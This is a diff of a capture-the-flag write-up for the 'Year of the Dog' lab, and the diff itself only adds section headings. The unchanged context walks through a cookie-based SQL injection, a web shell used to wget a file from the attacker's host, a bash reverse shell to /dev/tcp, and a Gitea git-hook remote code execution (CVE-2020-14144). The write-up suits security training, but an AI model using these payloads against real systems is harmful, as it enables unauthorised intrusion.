@@ -12,6 +12,7 @@ SSH on port 22 and webserver on port 80 as usual.
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20120630.png)
 
 I used gobuster for any hidden directories but got nothing.<br>
+### SQL INJECTION
 Using burp , we see there is a cookie being stored. We could do some injection with the cookie.
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20121211.png)
@@ -40,6 +41,7 @@ Using Command : `Cookie: id=6957bbd77dec77da95bbe62b24d2a92f' UNION SELECT 1,LOA
  ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20142410.png)
 
 It works!<br>
+## INITIAL EXPLOIT
 Now to move in , save this : `bash -i >& /dev/tcp/<IP Address>/<PORT> 0>&1` to a file and transfer it to the webserver using `<MACHINE-IP>/cmd.php?cmd=wget <YOUR-IP>:<PORT>/<file>`
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20143013.png)
@@ -52,6 +54,9 @@ We are www-data. There is the user flag in dylan's home directory but we don't h
 In there we find Dylan's SSH password.
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20143630.png)
+
+## FOOTHOLD
+
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20144149.png)
 
 Using `ifconfig`, there seems to be a docker address. We don't seem to be in a container so probably that will come later.
@@ -80,6 +85,7 @@ And we're in:
 
 ![](https://github.com/ishXD/CTF-writeups/blob/main/Year%20of%20the%20Dog/images/Screenshot%202023-07-13%20151257.png)
 
+## EXPLOITATION
 Now searching for any Gitea version 1.13.0 exploits , I found  [CVE-2020-14144](https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce) exploit.<br>
 In the Test-repo, we go to `settings` > `Git Hooks` > `Post Recieve Hook`.<br> In this hook , we can write a shell script that will get executed after getting a new commit.<br>
 
